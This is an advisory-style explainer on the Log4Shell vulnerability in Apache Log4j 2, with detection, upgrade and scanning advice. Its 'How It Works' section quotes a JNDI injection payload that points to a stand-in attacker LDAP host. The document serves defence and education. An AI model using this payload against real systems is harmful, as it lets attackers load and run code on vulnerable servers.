# CVE-2021-44228 – Log4Shell

## Summary

CVE-2021-44228, also known as **Log4Shell**, is a critical remote code execution (RCE) vulnerability in the Apache Log4j 2 library, affecting versions 2.0 to 2.14.1. It allows unauthenticated attackers to execute arbitrary code on vulnerable servers by logging a specially crafted string.

- **Published:** December 2021
- **CVSS Score:** 10.0 (Critical)
- **Affected Software:** Apache Log4j 2
- **Attack Vector:** Remote (via user-supplied log messages)

## Why It Matters

- Widely used Java library in cloud services, CI/CD tools, logging frameworks, and enterprise apps.
- Easily exploitable with minimal effort using JNDI injection.
- Triggered a global response due to massive potential for compromise in cloud and container environments.

## How It Works

The vulnerability abuses the JNDI feature of Log4j, allowing attackers to send a payload like:

${jndi:ldap://attacker.com/a}

When this string is logged, Log4j makes an outbound connection to the attacker’s LDAP server, loading and executing malicious code.

## Detection and Response

- Use scanners like **Trivy**, **Snyk**, or **Defender for Cloud** to detect Log4j in images or VMs.
- Block outbound LDAP/RMI/DNS connections from apps.
- Upgrade Log4j to **2.16.0 or later**.
- Monitor logs for exploitation attempts.

## Mitigation Commands

```bash
# Use Trivy to scan a container for CVEs
trivy image your-container:tag

# Or check locally installed Java apps
find / -type f -name "log4j-core*.jar"
